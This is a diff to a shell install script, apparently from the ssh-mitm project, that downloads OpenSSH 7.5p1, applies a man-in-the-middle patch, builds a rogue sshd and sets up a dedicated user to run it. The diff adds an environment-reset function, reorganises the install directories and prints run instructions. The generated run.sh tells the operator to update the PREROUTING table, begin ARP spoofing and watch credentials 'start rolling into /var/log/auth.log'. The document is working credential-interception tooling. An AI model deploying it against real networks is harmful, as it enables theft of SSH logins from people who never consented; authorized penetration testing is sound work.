@@ -3,11 +3,29 @@
 openssh_sources='openssh-7.5p1.tar.gz'
 openssh_source_dir='openssh-7.5p1'
 mitm_patch='openssh-7.5p1-mitm.patch'
-openssl_dir=''
+
+
+# Resets the environment (in case this script was run once before).
+function reset_env {
+
+    # Remove files previously downloaded.
+    rm -rf *.asc $openssh_sources $openssh_source_dir $openssh_source_dir-mitm
+
+    # Make sure no sshd_mitm is running and the user is logged out.
+    killall -u ssh-mitm 2> /dev/null
+
+    # Delete the ssh-mitm user, if it exists.
+    id ssh-mitm > /dev/null 2> /dev/null
+    if [[ $? == 0 ]]; then
+        userdel -f -r ssh-mitm 2> /dev/null
+    fi
+
+    return 1
+}
 
 
 # Installs prerequisites.
-function install_prereqs() {
+function install_prereqs {
     echo -e "Installing prerequisites...\n"
 
     declare -a packages
@@ -38,8 +56,6 @@ function get_openssh {
     local openssh_sig='openssh-7.5p1.tar.gz.asc'
     local release_key_fingerprint_expected='59C2 118E D206 D927 E667  EBE3 D3E5 F56B 6D92 0D30'
     local openssh_checksum_expected='9846e3c5fab9f0547400b4d2c017992f914222b3fd1f8eee6c7dc6bc5e59f9f0'
-
-    rm -rf RELEASE_KEY.asc openssh-*.tar.gz* openssh-*/
 
     echo -e "\nGetting OpenSSH release key...\n"
     wget https://ftp.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE_KEY.asc
@@ -99,12 +115,6 @@ function compile_openssh {
 
     echo -e "\nDone.  Compiling modified OpenSSH sources...\n"
 
-    # Check if an OpenSSL directory was given (for compiling under Kali).
-    local openssl_flag=
-    if [[ $openssl_dir != '' ]]; then
-        openssl_flag="--with-ssl-dir=$openssl_dir"
-    fi
-
     ./configure --with-sandbox=no --with-privsep-path=/home/ssh-mitm/empty --with-pid-dir=/home/ssh-mitm --with-lastlog=/home/ssh-mitm $openssl_flag
     make -j `nproc --all`
     popd > /dev/null
@@ -116,17 +126,18 @@ function setup_environment {
     echo -e "\nCreating ssh-mitm user, and setting up its environment...\n"
     useradd -m -s /bin/bash ssh-mitm
     chmod 0700 ~ssh-mitm
-    cp $openssh_source_dir/sshd_config ~ssh-mitm
-    cp $openssh_source_dir/sshd ~ssh-mitm/sshd_mitm || (echo "Error: sshd_mitm was not correctly built!"; exit -1)
-    cp $openssh_source_dir/ssh ~ssh-mitm/ssh || (echo "Error: ssh was not correctly built!"; exit -1)
-    strip ~ssh-mitm/sshd_mitm ~ssh-mitm/ssh
-    ssh-keygen -t rsa -b 4096 -f /home/ssh-mitm/ssh_host_rsa_key -N ''
-    ssh-keygen -t ed25519 -f /home/ssh-mitm/ssh_host_ed25519_key -N ''
+    mkdir -m 0755 ~ssh-mitm/{bin,etc}
+    cp $openssh_source_dir/sshd_config ~ssh-mitm/etc/
+    cp $openssh_source_dir/sshd ~ssh-mitm/bin/sshd_mitm || (echo "Error: sshd_mitm was not correctly built!"; exit -1)
+    cp $openssh_source_dir/ssh ~ssh-mitm/bin/ssh || (echo "Error: ssh was not correctly built!"; exit -1)
+    strip ~ssh-mitm/bin/sshd_mitm ~ssh-mitm/bin/ssh
+    ssh-keygen -t rsa -b 4096 -f /home/ssh-mitm/etc/ssh_host_rsa_key -N ''
+    ssh-keygen -t ed25519 -f /home/ssh-mitm/etc/ssh_host_ed25519_key -N ''
     mkdir -m 0700 ~ssh-mitm/empty
-    chown ssh-mitm:ssh-mitm /home/ssh-mitm/empty /home/ssh-mitm/ssh_host_*key*
+    chown ssh-mitm:ssh-mitm /home/ssh-mitm/empty /home/ssh-mitm/etc/ssh_host_*key*
     cat > ~ssh-mitm/run.sh <<EOF
 #!/bin/bash
-/home/ssh-mitm/sshd_mitm -f /home/ssh-mitm/sshd_config
+/home/ssh-mitm/bin/sshd_mitm -f /home/ssh-mitm/etc/sshd_config
 if [[ $? == 0 ]]; then
     echo "sshd_mitm is running.  Now update the PREROUTING table, begin ARP spoofing, and credentials should start rolling into /var/log/auth.log.  See README.md for more information."
 fi
@@ -140,9 +151,11 @@ if [[ `id -u` != 0 ]]; then
     exit -1
 fi
 
-openssl_dir=$1
+reset_env
 install_prereqs
 get_openssh
 compile_openssh
 setup_environment
+
+echo -e "\n\nDone!  You can now execute sshd_mitm with:  su - ssh-mitm -c \"./run.sh\"\n\n"
 exit 0
